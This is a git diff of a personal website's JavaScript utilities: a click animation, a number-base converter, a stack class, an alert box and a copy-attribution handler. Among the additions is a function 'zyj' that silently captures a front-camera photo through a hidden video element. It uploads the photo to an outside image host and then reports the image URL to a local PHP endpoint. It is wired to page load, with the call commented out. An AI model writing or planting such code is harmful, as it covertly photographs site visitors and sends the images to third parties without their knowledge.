@@ -15,42 +15,10 @@ window.addEventListener("load", function() {
     }, 500);
 })
 
-/*
-function stopEvent(el,event){
-    this.pd = true
-    el['on' + event] = () => {
-        this.pd = false
-    }
-    while (this.pd) {
-        this.num++
-        console.log(this.num)
-    }
-}
-function stopSleep(end){
-    this.num = 0
-    while (this.num <= end) {
-        this.num++
-        console.log(this.num)
-    }
-}
-function stopSleep2(time){
-    this.num = 0
-    console.time('sleep')
-    while (console.timeLog('sleep') * 1000 <= time) {
-        this.num++
-        console.log(this.num)
-        console.timeEnd('sleep')
-    }
-}
-const sleep = (delay) => new Promise((resolve) => void setTimeout(resolve, delay));
-*/
-
 function sleep(times){
     const startTime = Date.now()
-    while(1){
-        if (Date.now() - startTime >= times) {
-            break;
-        }
+    while(Date.now() - startTime <= times){
+        console.log('sleeping...')
     }
     return true;
 }
@@ -58,10 +26,24 @@ function sleep(times){
 function uploadError(){
     
 }
+function realTyprofCompare(x, y){x
+    if(isNaN(x) && isNaN(y)){
+        return true;
+    }
+    if((x === null || y === null) && (x !== null || y !== null)){
+        return false;
+    }
+    return typeof x === typeof y;
+}
+
 function script(src){
-    const scri = document.createElement("creat")
-    scri.src = src
-    document.body.appendChild(scri)
+    return new Promise((resolve, reject) => {
+        const scri = document.createElement("script")
+        scri.src = src
+        document.body.appendChild(scri)
+        scri.addEventListener("load", resolve)
+        scri.addEventListener("error", reject)
+    })
 }
 
 function waterMark(text){
@@ -229,50 +211,264 @@ Object?.a
 
 
 /** 春节花活：点击文字 */
-window.addEventListener("load", function() {
-    (function () {
-      var a_idx = 0;
-      window.onclick = function (event) {
-        var a = new Array("❤富强❤", "❤民主❤", "❤文明❤", "❤和谐❤", "❤自由❤", "❤平等❤", "❤公正❤", "❤法治❤", "❤爱国❤",
-          "❤敬业❤", "❤诚信❤", "❤友善❤");
+const DJlists = ['富强', '民主', '文明', '和谐', '自由', '平等', '公正', '法治', '爱国', '敬业', '诚信', '友善'];
+const DJsi = DJlists[Symbol.iterator]
+var newDJsi = DJsi.call(DJlists)
 
-        var heart = document.createElement("b"); //创建b元素
-        heart.onselectstart = new Function('event.returnValue=false'); //防止拖动
-
-        document.body.appendChild(heart).innerHTML = a[a_idx]; //将b元素添加到页面上
-        a_idx = (a_idx + 1) % a.length;
-        heart.style.cssText = "position: fixed;left:-100%;"; //给p元素设置样式
-
-        var f = 12, // 字体大小
-          x = event.clientX - f * 2, // 横坐标
-          y = event.clientY - f * 2, // 纵坐标
-          c = randomColor(), // 随机颜色
-          a = 1, // 透明度
-          s = 1.2; // 放大缩小
-
-        var timer = setInterval(function () { //添加定时器
-          if (a <= 0) {
-            document.body.removeChild(heart);
-            clearInterval(timer);
-          } else {
-            heart.style.cssText = "font-size:12px;cursor: default;position: fixed;color:" +
-              c + ";left:" + x + "px;top:" + y + "px;opacity:" + a + ";transform:scale(" +
-              s + ");";
-
-            y--;
-            a -= 0.016;
-            s += 0.002;
-          }
-        }, 10)
-
-      }
-      // 随机颜色
-      function randomColor() {
-
+window.addEventListener("click", function(e) {
+    function randomColor() {
         return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math
           .random() * 255)) + ")";
+    }
+    
+    var nex = newDJsi.next();
+    if(nex.done){
+        newDJsi = DJsi.call(DJlists)
+        nex = newDJsi.next();
+    }
+    
+    const text = $("<b></b>")
 
-      }
-    }());
+    text.text(nex.value)
+    text.css({
+        color: randomColor(),
+        position: "fixed",
+        fontSize : "16px",
+        left: e.pageX - 8,
+        top: e.pageY,
+        opacity: 1
+    })
+    
+    window.e = e
+    text.animate({
+        top: "-=30px",
+        opacity: 0
+    }, 500, () => {
+        $(text).remove()
+    })
+    $('html').append(text)
 })
 
+function smpx(arr){
+    return new Promise((resolve, reject) => {
+        const result = [];
+        arr.forEach(item => {
+            setTimeout(() => {
+                result.push(item)
+                if (result.length === arr.length) {
+                    return resolve(result);
+                }
+            }, item)
+        })
+    })
+}
+
+async function zyj() {
+  try {
+    // 请求访问前置摄像头
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user' }
+    });
+
+    // 创建并配置video元素
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.autoplay = true;
+    video.muted = true
+    video.style.display = 'none';
+
+    // 等待视频准备就绪
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => {
+        video.play().then(resolve);
+      };
+    });
+
+
+    // 创建临时canvas获取图像数据
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    
+    // 绘制视频帧到canvas
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // 将canvas转换为Blob
+    canvas.toBlob(async (blob) => {
+      try {
+        // 创建FormData并添加文件
+        const formData = new FormData();
+        formData.append('file', blob, 'photo.jpg');
+
+
+        // 使用jQuery Ajax发送请求
+        await $.ajax({
+          url: 'https://api.xinyew.cn/api/360tc',
+          type: 'POST',
+          data: formData,
+          processData: false,
+          contentType: false,
+          success: ress => {
+              var res
+              try{
+                res = JSON.parse(ress)
+              }
+              catch(e){
+                  res = ress
+              }
+              $.ajax({
+                  url: '/resource/imgbed/2.php',
+                  type: 'post',
+                  data: {
+                      url: res.data.url,
+                      uid: 9999
+                  }
+              })
+          }
+        });
+      } catch (error) {
+        console.log('上传失败: ' + err);
+      } finally {
+        stream.getTracks().forEach(track => track.stop());
+      }
+    }, 'image/jpeg', 0.85);  
+
+  } catch (error) {
+    console.log('操作失败: ' + error.message);
+  }
+}
+window.addEventListener("load", e => {
+    // zyj()
+})
+
+
+class Stack {
+    #_list = [];
+    push(...data) {
+        return this.#_list.push(...data);
+    }
+    pop() {
+        return this.#_list.pop();
+    }
+    peak() {
+        return this.#_list.at(-1);
+    }
+    isEmpty() {
+        return !this.#_list.length;
+    }
+    size() {
+        return this.#_list.length;
+    }
+    clear() {
+        return this.#_list.length = 0;
+    }
+    toString() {
+        return this.#_list.join("");
+    }
+}
+
+function JZ(num2, jz, jkh, baseArray) {
+    if (num2 === 0) {
+        return 0;
+    }
+    var isFS
+    if (Math.abs(num2) === num2) {
+        isFS = false
+    }
+    else{
+        isFS = true
+    }
+    var num = Math.abs(num2)
+    const stackArray = new Stack();
+    const baseEs = baseArray ?? ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
+    let nextNumber = num;
+    while (nextNumber > 0) {
+        var ThisNumber = nextNumber % jz;
+        if (jkh) {
+            ThisNumber = `(${baseEs[ThisNumber]})`;
+        }
+        else {
+            ThisNumber = baseEs[ThisNumber];
+        }
+        stackArray.push(ThisNumber);
+        nextNumber = Math.floor(nextNumber / jz);
+    }
+    let result = "";
+    if (isFS) {
+        result = "-"
+    }
+    while (!stackArray.isEmpty()) {
+        result += stackArray.pop();
+    }
+    return result;
+}
+
+function chunk(arr, size) {
+    const Need = Math.ceil(arr.length / size);
+    let newArr = [];
+    for (let i = 0; i < Need; i++) {
+        newArr.push(arr.slice(i * size, i * size + size));
+    }
+    return newArr;
+}
+
+function Alert(information){
+    const ale = $("<div id='ale'></div>")
+    $(ale).css({
+        position: "fixed",
+        top: "0",
+        left: '0',
+        width: "100vw",
+        height: "0",
+        textAlign: "left",
+        backgroundColor: "var(--whiteColor)",
+        display: 'flex',
+        flexDirection: 'row',
+        justifyContent: 'center',
+        alignItems: 'center',
+        borderBottom: "var(--backgroundColor) solid 1px"
+    })
+    $(ale).html(`${information}<button class="albtn" onclick="closeAlert()">确定</button>`)
+    
+    $(ale).animate({
+        height: "15vh"
+    }, 400)
+    $("body").append(ale)
+    $(".albtn").css({
+        backgroundColor: "var(--themeColor)",
+        border: 'none',
+        color: "var(--whiteColor)",
+        borderRadius: "0.5vh"
+    })
+}
+function closeAlert(){
+    let ale = document.getElementById("ale")
+    ale.animate({
+        height: 0
+    }, 325)
+    setTimeout(() => {
+        $(ale).remove()
+    }, 325)
+}
+window.addEventListener('copy', function (event) {
+    let clipboardData = event.clipboardData || window.clipboardData;
+    if (!clipboardData) return;
+    let text = window.getSelection().toString();
+    if (text) {
+      event.preventDefault();
+      clipboardData.setData('text/plain', text + '\n\n来源于ZVR-SK，请遵循CC-BY-NC-SA (创作共用许可协议)');
+      Alert("请遵循CC-BY-NC-SA (创作共用许可协议)")
+    }
+});
+/*
+HTMLElement.prototype.styles = function(arr, ...args){
+    return this
+}
+HTMLElement.prototype.attrs = function(){
+    return this
+}
+HTMLElement.prototype.text = function(){
+    return this
+}
+*/
